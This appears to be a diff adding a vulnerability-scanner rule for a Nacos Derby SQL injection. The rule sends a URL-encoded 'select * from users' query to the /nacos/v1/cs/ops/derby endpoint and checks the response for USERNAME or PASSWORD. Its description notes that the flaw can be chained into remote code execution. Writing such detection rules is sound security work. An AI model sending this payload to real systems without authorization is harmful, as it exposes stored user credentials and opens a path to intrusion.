@@ -1,0 +1,12 @@
+name: Nacos-Derby-SQL注入
+description: "SQL注入，配合/data/removal接口可导致RCE"
+alwaysExecute: true
+matchCount: 1
+rules:
+  - method: GET
+    path: "/nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73"
+    expression:
+      status: 200
+      body_any:
+        - "USERNAME"
+        - "PASSWORD"
